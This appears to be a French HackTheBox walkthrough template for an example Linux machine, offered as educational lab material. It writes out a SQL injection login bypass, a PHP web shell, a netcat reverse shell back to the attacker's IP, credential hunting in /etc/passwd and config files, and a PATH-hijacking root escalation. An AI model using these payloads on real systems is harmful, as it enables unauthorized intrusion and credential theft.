# Example Machine - HTB Walkthrough

> **Note:** Ceci est un exemple de walkthrough pour démontrer le système. Remplacez ce contenu par vos propres walkthroughs.

## 📋 Informations

- **Machine:** Example Machine
- **Plateforme:** HackTheBox
- **OS:** Linux
- **Difficulté:** Medium
- **Date de résolution:** Janvier 2025

---

## 🎯 Résumé

Cette machine est un excellent exercice pour pratiquer l'exploitation web, l'énumération Linux et l'élévation de privilèges via des fichiers SUID.

**Compétences requises:**
- Énumération web basique
- SQL Injection
- Énumération Linux
- Recherche de vulnérabilités

**Compétences apprises:**
- Exploitation de SQLi avancée
- Élévation de privilèges via SUID
- Analyse de code source

---

## 🔍 Reconnaissance

### Scan Nmap

```bash
nmap -sC -sV -oN nmap/initial 10.10.10.100
```

**Résultats:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

### Énumération Web

En visitant le site web, on découvre une application de gestion avec plusieurs fonctionnalités.

```bash
gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt
```

**Découvertes importantes:**
- `/admin` - Panel d'administration (login requis)
- `/upload` - Fonctionnalité d'upload de fichiers
- `/api` - API endpoint

---

## 🚪 Point d'entrée initial

### Vulnérabilité SQL Injection

Le formulaire de login est vulnérable à l'injection SQL.

**Test basique:**
```http
POST /login HTTP/1.1
Host: 10.10.10.100

username=admin' OR 1=1--&password=anything
```

### Exploitation avec SQLMap

```bash
sqlmap -u "http://10.10.10.100/login" \
  --data="username=admin&password=test" \
  --dbs
```

Nous avons trouvé une base de données `webapp` contenant des credentials.

### Shell initial

Après avoir obtenu les credentials, nous pouvons uploader un reverse shell PHP:

```php
<?php system($_GET['cmd']); ?>
```

```bash
# Sur notre machine
nc -lvnp 4444

# Via le navigateur
http://10.10.10.100/uploads/shell.php?cmd=nc -e /bin/bash VOTRE_IP 4444
```

Shell obtenu en tant que `www-data`.

---

## 👤 User Flag

### Énumération locale

```bash
# Listing des utilisateurs
cat /etc/passwd | grep -v nologin

# Recherche de fichiers intéressants
find /var/www -type f -name "*.conf" 2>/dev/null
```

Nous trouvons des credentials dans `/var/www/html/config.php`:

```php
$db_user = "developer";
$db_pass = "P@ssw0rd123!";
```

### Élévation vers l'utilisateur

Ces credentials fonctionnent en SSH:

```bash
ssh developer@10.10.10.100
```

**Flag User:**
```bash
cat /home/developer/user.txt
```

---

## 🔐 Root Flag

### Énumération privilèges

```bash
# Vérifier les binaires SUID
find / -perm -4000 2>/dev/null
```

On trouve un binaire custom `/opt/backup` qui est SUID root.

### Analyse du binaire

```bash
strings /opt/backup
```

Le binaire appelle `tar` sans chemin absolu !

### Privilege Escalation

Nous pouvons exploiter le PATH hijacking:

```bash
cd /tmp
echo "/bin/bash" > tar
chmod +x tar
export PATH=/tmp:$PATH
/opt/backup
```

### Root Access

```bash
whoami
# root

cat /root/root.txt
```

---

## 🎓 Lessons Learned

### Ce que j'ai appris

1. **SQL Injection:** Comment identifier et exploiter une SQLi dans un formulaire de login
2. **Path Hijacking:** Technique d'élévation de privilèges via la manipulation du PATH
3. **Énumération:** L'importance de l'énumération approfondie des fichiers de configuration

### Points clés à retenir

- ⚠️ Toujours tester les inputs pour les injections SQL
- 💡 Vérifier les fichiers de configuration pour des credentials
- 🔑 Les binaires SUID custom sont souvent vulnérables

---

## 🛠️ Outils utilisés

- **Nmap** - Scan de ports
- **Gobuster** - Directory enumeration
- **SQLMap** - SQL Injection automation
- **Burp Suite** - Analyse des requêtes HTTP
- **Netcat** - Reverse shell

---

## ⚠️ Disclaimer

Ce walkthrough est à but éducatif uniquement. N'utilisez ces techniques que sur des machines auxquelles vous avez l'autorisation d'accéder (comme HackTheBox, TryHackMe, etc.).

---

**Date de rédaction:** Janvier 2025  
**Auteur:** Samuel Tesson
